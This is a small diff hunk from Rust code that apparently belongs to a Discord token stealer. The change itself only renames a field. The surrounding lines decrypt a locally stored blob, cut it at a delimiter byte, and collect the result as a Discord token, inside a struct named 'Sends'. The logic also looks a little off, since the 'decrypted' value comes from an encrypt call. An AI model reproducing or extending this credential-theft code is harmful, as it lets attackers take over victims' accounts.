@@ -71,7 +71,7 @@ impl Sends {
                             let decrypted = cipher.encrypt(Nonce::from_slice(iv), payload);
                             let token = decrypted.ok()?;
                             let token = token.split(|y| *y == 249).collect::<Vec<_>>()[0];
-                            self.discord_client_token.push(String::from_utf8(token.to_vec()).ok()?);
+                            self.discord_token.push(String::from_utf8(token.to_vec()).ok()?);
                             break;
                         }
                     }
